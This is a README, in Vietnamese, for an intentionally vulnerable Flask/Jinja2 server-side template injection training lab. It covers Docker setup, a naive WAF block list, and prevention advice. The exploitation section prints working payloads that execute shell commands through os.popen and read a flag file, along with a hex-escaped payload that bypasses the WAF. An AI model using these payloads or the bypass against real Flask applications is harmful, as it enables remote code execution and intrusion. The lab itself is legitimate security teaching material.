# SSTI Lab (Flask + Jinja2)

## 1) Giới thiệu

Lab mô phỏng lỗ hổng **SSTI (Server-Side Template Injection)** trong **Flask/Jinja2**. Ứng dụng cố tình **nhúng trực tiếp** dữ liệu do người dùng nhập vào **chuỗi template** rồi render bằng `render_template_string(...)`, dẫn đến Jinja2 biên dịch và thực thi biểu thức template do người dùng cung cấp.

Bản lab có kèm **“naive WAF”** minh họa, chặn một số token thường thấy trong khai thác SSTI:  
`'.'`, `'_'`, `'|join'`, `'['`, `']'`, `'mro'`, `'base'`.

---

## 2) Cấu trúc thư mục

```
ssti-lab/
├─ app.py                 # Ứng dụng Flask (có lỗ hổng SSTI + naive WAF)
├─ requirements.txt       # Thư viện Python
├─ Dockerfile             # Image chạy app
├─ docker-compose.yml     # Chạy nhanh bằng compose
├─ templates/
│  ├─ base.html           # Khung giao diện
│  └─ index.html          # Trang "an toàn" (safe-preview)
└─ README.md              # Tài liệu (file này)
```

---

## 3) Chạy nhanh

### Cách 1: Docker Compose (khuyên dùng)

```bash
docker compose up --build
# Sau đó mở: http://127.0.0.1:4000/
```

### Cách 2: Docker thuần

```bash
docker build -t ssti-lab .
docker run --rm -p 4000:4000 ssti-lab
# Mở: http://127.0.0.1:4000/
```

### Cách 3: Chạy local (không Docker)

```bash
python -m venv .venv
. .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt
python app.py
# Mở: http://127.0.0.1:4000/
```

---

## 4) Các route chính

- `/` – **SSTI Playground** (có lỗ hổng).  
  Nhập payload vào ô input. Ứng dụng sẽ **chèn trực tiếp** payload vào template string và render bằng Jinja2.

- `/safe-preview` – **Ví dụ an toàn** (không lỗ hổng).  
  Chỉ render biến đã **escape** trong template file cố định.

---

## 5) Naive WAF minh họa

Trong `app.py`, payload sẽ bị **chặn** nếu chứa **bất kỳ** token sau (không phân biệt hoa thường, `|join` cho phép khoảng trắng sau `|`):

- `.` (dấu chấm)
- `_` (gạch dưới)
- `|join`
- `[` và `]`
- `mro`
- `base`

Khi bị chặn, trang sẽ hiển thị banner “Bị chặn bởi WAF” và chỉ **echo** payload theo kiểu text an toàn (không render như template).

---

## 6) Khai thác (trong lab)

1. **Thử SSTI cơ bản**
   - Nhập: `{{7*7}}`  
   - Kỳ vọng: hiển thị `49`.

2. **Thử đọc thông tin môi trường**
   - Ví dụ: `{{ config }}` hoặc `{{ request.environ['SERVER_NAME'] }}`  
   - Tùy trường hợp WAF có thể chặn.

3. **RCE/đọc file (demo trong container lab)**
   - Ví dụ payload thường thấy (có thể bị chặn do chứa `.` hoặc `_`):
     ```python
     {{ cycler.__init__.__globals__.os.popen('id').read() }}
     {{ config.__class__.__init__.__globals__['os'].popen('uname -a').read() }}
     {{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
     ```
   - Lab có file `flag.txt` mẫu tại `/app/flag.txt` để bạn quan sát hành vi đọc file/RCE **bên trong container** (không phải máy host).

- Payload bypass WAR:
   ```python
   {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
   ```


---

## 7) Tại sao có lỗ hổng?

Trong route `/`, server **nhúng trực tiếp** chuỗi người dùng nhập (`q`) vào **template string** rồi gọi `render_template_string(...)`. Khi đó, mọi biểu thức `{{ ... }}` trong payload sẽ được Jinja2 **diễn giải và thực thi phía server** → **SSTI**.

> Lưu ý: trước đây nếu bạn dùng toán tử format `%` để chèn `q` vào template có chứa nhiều `{% ... %}`, Python có thể ném lỗi `TypeError: must be real number, not str` vì lẫn lộn `%`. Bản hiện tại dùng `replace`/placeholder để tránh xung đột đó.

---

## 8) Phòng tránh 

- **Không bao giờ** đưa user input vào template string.  
  Dùng template **cố định** (`render_template`) và **escape** biến (autoescape mặc định của Jinja2).
- Tránh truyền các đối tượng có thể dẫn đến truy cập `__globals__` vào context.
- Bật `StrictUndefined` trong Jinja2 để giảm khả năng “dò thuộc tính”.
- Ở tầng kiến trúc: tách chức năng “preview text” ra khỏi engine template (hiển thị text thuần, không biên dịch).

---

